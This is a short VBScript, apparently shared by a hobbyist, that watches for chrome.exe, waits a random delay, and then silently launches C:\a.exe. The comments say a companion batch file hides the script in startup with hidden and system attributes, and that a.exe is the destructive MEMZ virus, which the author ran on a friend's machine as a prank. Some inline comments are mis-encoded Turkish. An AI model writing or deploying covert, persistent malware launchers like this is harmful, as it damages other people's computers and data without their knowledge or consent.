'Ok so this one is special for me. why? because its my first timed thing.
'it checks process list and looks for "chrome.exe" you can change it to anything you want.
'What i did with it? this vbs doesnt work by itself instead it uses "bumbum.bat".
'bumbum.bat hides this file to startup. why .bat? because its easy to hide .bat files inside executables.
'added this ntfs tags +h for hidden +s for hidden even if user can see hidden files
'it cant see +s files because they look like system files.
'I started this this will start C:\a.exe without a window what does a.exe contain? memz virus! it was best joke i ever did to my friend!
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
Set colItems = objWMIService.ExecQuery("Select * From Win32_Process Where Name = 'chrome.exe'")
Set objShell = CreateObject("WScript.Shell")
Do
If colItems.Count > 0 Then
    Randomize
    timeout = Int((269 - 69 + 1) * Rnd + 30)  ' 31-169 aras� random bi�e
    WScript.Sleep timeout * 1000  ' Saniyeyi Saniyeci�e
    objShell.Run "C:\a.exe", 0, False  ' C:\a.exe pencereciksiz �al��t�rayo
End If
Randomize
sleep_time = Int((2 - 1 + 1) * Rnd + 30)  ' Yeniden a�mak i�in mola
WScript.Sleep sleep_time * 1000  ' Saniyeden Saniyecikci�e
Loop
